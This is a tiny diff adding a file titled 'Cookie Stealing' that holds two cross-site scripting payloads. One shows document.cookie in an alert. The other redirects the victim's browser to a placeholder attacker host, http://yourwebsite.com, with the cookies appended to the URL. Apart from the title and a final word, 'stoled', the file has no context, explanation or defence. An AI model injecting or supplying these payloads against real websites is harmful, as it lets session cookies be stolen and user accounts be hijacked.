@@ -1,0 +1,8 @@
+Cookie Stealing
+
+<script>alert(document.cookie)</script>
+
+<script>document.location.href="http://yourwebsite.com/p/?page="+document.cookie</script>
+
+stoled
+
